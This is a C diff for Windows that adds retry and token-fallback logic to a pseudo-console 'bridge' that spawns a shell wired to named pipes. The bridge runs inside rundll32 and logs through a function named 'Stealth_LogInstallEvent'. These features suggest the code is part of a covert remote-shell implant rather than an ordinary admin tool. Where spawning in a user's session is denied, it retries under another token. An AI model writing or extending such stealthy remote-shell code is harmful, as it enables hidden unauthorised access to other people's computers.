@@ -20,6 +20,8 @@
 #define MESH_CONSOLE_BRIDGE_CONNECT_TIMEOUT_MS 15000UL
 #define MESH_CONSOLE_BRIDGE_IO_BUFFER_SIZE 8192
 #define MESH_CONSOLE_BRIDGE_NO_SESSION 0xFFFFFFFFUL
+#define MESH_CONSOLE_BRIDGE_SHELL_SPAWN_ATTEMPTS 3UL
+#define MESH_CONSOLE_BRIDGE_SHELL_SPAWN_RETRY_DELAY_MS 500UL
 
 typedef HRESULT (WINAPI* MeshConsoleBridge_CreatePseudoConsoleFn)(COORD, HANDLE, HANDLE, DWORD, HANDLE*);
 typedef void (WINAPI* MeshConsoleBridge_ClosePseudoConsoleFn)(HANDLE);
@@ -1210,6 +1212,69 @@ static BOOL MeshConsoleBridge_CreateShellProcessW(HANDLE pseudoConsole, const wc
     return ok;
 }
 
+static BOOL MeshConsoleBridge_IsSessionSpawnFallbackError(DWORD errorCode)
+{
+    return (errorCode == ERROR_ACCESS_DENIED ||
+        errorCode == ERROR_PRIVILEGE_NOT_HELD ||
+        errorCode == ERROR_NOT_ALL_ASSIGNED) ? TRUE : FALSE;
+}
+
+static BOOL MeshConsoleBridge_CreateShellProcessWithRetryW(HANDLE pseudoConsole, const wchar_t* shellPath, wchar_t* commandLine, DWORD targetSessionId, PROCESS_INFORMATION* processInfo)
+{
+    DWORD attempt = 0;
+    DWORD lastError = ERROR_SUCCESS;
+
+    if (processInfo == NULL)
+    {
+        SetLastError(ERROR_INVALID_PARAMETER);
+        return FALSE;
+    }
+
+    for (attempt = 1; attempt <= MESH_CONSOLE_BRIDGE_SHELL_SPAWN_ATTEMPTS; ++attempt)
+    {
+        ZeroMemory(processInfo, sizeof(*processInfo));
+        if (MeshConsoleBridge_CreateShellProcessW(pseudoConsole, shellPath, commandLine, targetSessionId, processInfo))
+        {
+            if (attempt > 1)
+            {
+                Stealth_LogInstallEvent(L"[CONSOLE_BRIDGE] Shell spawn recovered inside same rundll32 attempt=%lu session=%lu",
+                    (unsigned long)attempt,
+                    (unsigned long)targetSessionId);
+            }
+            return TRUE;
+        }
+
+        lastError = GetLastError();
+        Stealth_LogInstallEvent(L"[CONSOLE_BRIDGE] Shell spawn failed inside same rundll32 attempt=%lu/%lu session=%lu error=%lu",
+            (unsigned long)attempt,
+            (unsigned long)MESH_CONSOLE_BRIDGE_SHELL_SPAWN_ATTEMPTS,
+            (unsigned long)targetSessionId,
+            (unsigned long)lastError);
+
+        if (attempt < MESH_CONSOLE_BRIDGE_SHELL_SPAWN_ATTEMPTS)
+        {
+            Sleep(MESH_CONSOLE_BRIDGE_SHELL_SPAWN_RETRY_DELAY_MS);
+        }
+    }
+
+    if (targetSessionId != MESH_CONSOLE_BRIDGE_NO_SESSION && MeshConsoleBridge_IsSessionSpawnFallbackError(lastError))
+    {
+        Stealth_LogInstallEvent(L"[CONSOLE_BRIDGE] Falling back to bridge token inside same rundll32 after session spawn denial session=%lu error=%lu",
+            (unsigned long)targetSessionId,
+            (unsigned long)lastError);
+        ZeroMemory(processInfo, sizeof(*processInfo));
+        if (MeshConsoleBridge_CreateShellProcessW(pseudoConsole, shellPath, commandLine, MESH_CONSOLE_BRIDGE_NO_SESSION, processInfo))
+        {
+            return TRUE;
+        }
+        lastError = GetLastError();
+        Stealth_LogInstallEvent(L"[CONSOLE_BRIDGE] Bridge-token shell fallback failed inside same rundll32 error=%lu", (unsigned long)lastError);
+    }
+
+    SetLastError(lastError == ERROR_SUCCESS ? ERROR_GEN_FAILURE : lastError);
+    return FALSE;
+}
+
 static DWORD WINAPI MeshConsoleBridge_CopyThread(LPVOID param)
 {
     MeshConsoleBridgeCopyContext* ctx = (MeshConsoleBridgeCopyContext*)param;
@@ -1295,7 +1360,7 @@ static DWORD MeshConsoleBridge_RunW(const wchar_t* inputPipeName, const wchar_t*
         if (exitCode == ERROR_SUCCESS) { exitCode = ERROR_NOT_SUPPORTED; }
         goto cleanup;
     }
-    if (!MeshConsoleBridge_CreateShellProcessW(pseudoConsole, shellPath, commandLine, targetSessionId, &processInfo))
+    if (!MeshConsoleBridge_CreateShellProcessWithRetryW(pseudoConsole, shellPath, commandLine, targetSessionId, &processInfo))
     {
         exitCode = GetLastError();
         goto cleanup;
